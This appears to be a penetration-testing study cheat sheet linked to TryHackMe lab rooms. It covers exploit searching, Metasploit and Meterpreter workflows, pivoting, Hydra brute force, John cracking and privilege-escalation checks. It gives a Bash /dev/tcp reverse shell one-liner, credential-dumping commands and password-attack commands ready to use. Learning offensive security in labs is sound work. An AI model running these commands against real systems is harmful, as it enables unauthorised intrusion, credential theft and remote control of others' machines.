# 3. Host & Network Penetration (Exploitation & Privilege Escalation)

## 3.1 Exploit Research and Weaponization

- Use `searchsploit <product> <version>`  
- Metasploit: `msfconsole â†’ search <term>`  
- Modify exploits: change LHOST/LPORT or payload  
- Compile C exploits: `gcc exploit.c -o exploit`
- Reverse shell one-liners:  
  Bash: `bash -i >& /dev/tcp/IP/PORT 0>&1`  
  PowerShell: `powershell -nop -c "$client = ..."`

## 3.2 Using Metasploit & Meterpreter

**Metasploit Workflow:**
- `use <exploit>`
- `set RHOST <target>`, `set LHOST <your-ip>`
- `run` or `exploit`

**Meterpreter Commands:**
- `sysinfo`, `getuid`, `ipconfig`, `route`
- `ls`, `cd`, `download`, `upload`
- `getsystem`, `hashdump`, `shell`
- `background`, `sessions -l`, `sessions -i`

**Pivoting:**
- `run autoroute -s <network>`
- `portfwd add -l <LPORT> -p <RPORT> -r <target>`
- Combine with `socks_proxy` and `proxychains`

**TryHackMe practice:**
- [Blue](https://tryhackme.com/room/blue)
- [Ice](https://tryhackme.com/room/ice)
- [Metasploit](https://tryhackme.com/room/metasploit)

## 3.3 Password Attacks

**Online Brute Force (Hydra):**
- SSH: `hydra -l root -P rockyou.txt ssh://<IP>`
- FTP: `hydra -L users.txt -P rockyou.txt ftp://<IP>`
- HTTP: `hydra -l admin -P pass.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`

**Offline Cracking (John):**
- `john --wordlist=rockyou.txt hashes.txt`
- `zip2john file.zip > hash.txt`
- `john hash.txt`

**TryHackMe practice:**
- [Brute It](https://tryhackme.com/room/bruteit)
- [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## 3.4 Privilege Escalation

**Linux:**
- `sudo -l`, check for `NOPASSWD` or allowed binaries
- SUID files: `find / -perm -4000 -type f 2>/dev/null`
- Cron jobs: `cat /etc/crontab`, `ls -l /etc/cron.*`
- Kernel exploits: Check `uname -r` and use `searchsploit`

**Windows:**
- `whoami /priv`, `systeminfo`
- Unquoted service paths: `wmic service get name,pathname,startmode`
- AlwaysInstallElevated: check registry keys
- Find stored passwords: `findstr /si password *.txt`

**Tools (if allowed):**
- LinPEAS / WinPEAS
- Metasploit: `getsystem`, exploit suggesters

**TryHackMe practice:**
- [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivescarena)
